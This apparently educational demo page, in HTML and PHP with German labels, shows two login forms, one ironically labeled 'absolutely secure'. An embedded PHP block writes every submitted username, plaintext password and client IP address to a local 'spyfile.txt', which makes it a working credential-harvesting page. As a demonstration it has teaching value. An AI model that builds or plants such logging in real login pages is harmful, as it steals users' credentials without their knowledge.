<html>

	<head>
		<title> Demo </title>
		
		<style>
			div{
				border: 1px solid black;
				margin: 0;
				padding: 0;

			}
			#page{
				background-color: lightcyan;
				position: fixed;
				width: 100%;
				height: 100%;
				top: 0;
				left: 0;
			}
			
			#save{
				position: fixed;
				top: 0;
				left: 0;
				width: 100%;
				height: 45%;
			}
			
			#sus{
				position: fixed;
				top: 45%;
				left: 0;
				width: 100%;
				height: 45%;
			}
			
			#creator{
				position: fixed;
				top: 90%;
				left: 0;
				width: 100%;
				height: 10%;
				background-color: darkcyan;
			}
			
			.flex{
				display: flex;
				justify-content: space-evenly;
			}
			
		</style>
	</head>
	
	<body>
			<div id="page">
				<div id="save">
					<h1> Normaler Log In</h1>
					<form class="flex">
						<input type="text" name="user" placeholder="Benutzername">
						<input type="password" name="pwd" placeholder="Password">
						<input type="submit" name="logIn"value="log in">
					</form>
				</div>
				<div id="sus">
					<h1> ABSOLUT SICHERER Log In</h1>
					<form class="flex">
						<input type="text" name="user" placeholder="Benutzername">
						<input type="password" name="pwd" placeholder="Password">
						<input type="submit" name="logIn"value="LogIn">
						
						<?php
							if(isset($_REQUEST["logIn"])){
								$file = fopen("spyfile.txt", "a");
								$text = "Username: ".$_REQUEST["user"]." | Password:".$_REQUEST["pwd"]." | Log in from IP: ".$_SERVER['REMOTE_ADDR']."\n";
								fwrite($file, $text);
								fclose($file);
							}
						?>
					</form>
					
				</div>
				<div id="creator" class="flex">
					Erstellt von Müller Korbinian
				</div>
			</div>
	</body>
</html>
